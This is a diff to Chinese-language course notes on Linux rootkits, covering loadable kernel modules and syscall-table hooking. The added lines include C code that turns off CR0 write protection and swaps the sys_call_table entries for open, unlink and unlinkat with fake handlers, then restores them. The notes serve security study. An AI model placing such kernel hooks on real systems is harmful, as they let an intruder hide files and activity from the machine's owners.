@@ -1,5 +1,7 @@
 > 软件安全原理大作业 RootKit 相关资料阅读
 
+[TOC]
+
 #### Linux 模块编程和 syscall hook 技巧
 
 **Loadable Kernel Module, LKM**
@@ -68,7 +70,7 @@ syscall hook 步骤：
 3. 新增模块，lsmod 查看
 4. 劫持进程创建模块代码
 
-#### Rootkit 系列一：LKM 的基础编写及隐藏
+#### Linux Rootkit 系列一：LKM 的基础编写及隐藏
 
 LKM, Loadable Kernel Modules，可加载内核模块，主要是用来扩展 linux 的内核功能。
 
@@ -164,6 +166,8 @@ void kobject_del(struct kobject *kobj);
 
 #### Linux Rootkit 系列二：syscall table hook
 
+> 用 virtualbox 别用 vmware！
+
 最简单的 syscall hook 是修改 `sys_call_table`：
 
 ```c
@@ -219,7 +223,7 @@ unsigned long **get_sys_call_table(void) {
 
 **关闭写保护**
 
-找到地址，下面就要关闭下保护。由 `CR0` 寄存器的第 16 位控制。可以使用 `read_cr0/write_cr0` 读写，置位或置零使用 `set_bit/clear_bit`。
+找到地址，下面就要关闭下保护。由 `CR0` 寄存器的第 16 位控制。可以使用 `read_cr0/write_cr0` 读写，置位或置零使用 `set_bit/clear_bit`。现在就可以修改调用表了，先保存好原始的再覆盖。
 
 ```c
 void disable_write_protection(void) {
@@ -233,8 +237,24 @@ void enable_write_protection(void) {
     set_bit(16, &cr0);
     write_cr0(cr0);
 }
+
+disable_write_protection();
+real_open = (void *)sys_call_table[__NR_open];
+sys_call_table[__NR_open] = (unsigned long*)fake_open;
+real_unlink = (void *)sys_call_table[__NR_unlink];
+sys_call_table[__NR_unlink] = (unsigned long*)fake_unlink;
+real_unlinkat = (void *)sys_call_table[__NR_unlinkat];
+sys_call_table[__NR_unlinkat] = (unsigned long*)fake_unlinkat;
+enable_write_protection();
+
+disable_write_protection();
+sys_call_table[__NR_open] = (unsigned long*)real_open;
+sys_call_table[__NR_unlink] = (unsigned long*)real_unlink;
+sys_call_table[__NR_unlinkat] = (unsigned long*)real_unlinkat;
+enable_write_protection();
 ```
 
-现在就可以修改调用表了，先保存好原始的再覆盖。
+#### Linux Rootkit 系列三：实例讲解 Rootkit 必备的基本功能
 
- 
+
+
